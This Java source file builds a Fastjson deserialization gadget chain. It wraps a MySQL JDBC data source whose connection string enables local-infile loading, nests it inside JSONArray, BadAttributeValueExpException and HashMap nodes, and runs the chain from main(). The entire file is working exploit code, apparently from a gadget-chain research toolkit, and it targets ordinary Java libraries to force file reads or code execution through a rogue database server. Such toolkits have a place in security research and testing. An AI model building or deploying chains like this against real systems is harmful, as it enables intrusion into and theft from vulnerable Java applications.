import common.Util;
import gadgets.*;

public class Fastjson4_MysqlDataSource {
    public Object getObject(String jdbc) throws Exception {

        Object node1 = MysqlDataSourceNode.makeGadget(jdbc);
        Object node2 = JsonArrayNode.makeGadget(2,node1);
        Object node3 = BadAttrValExeNode.makeGadget(node2);
        Object[] array = new Object[]{node1,node3};
        Object node4 = HashMapNode.makeGadget(array);
        return node4;
    }

    public static void main(String[] args) throws Exception {
        String jdbc = "jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&maxAllowedPacket=655360";
        Object object = new Fastjson4_MysqlDataSource().getObject(jdbc);
        Util.runGadgets(object);
    }
}
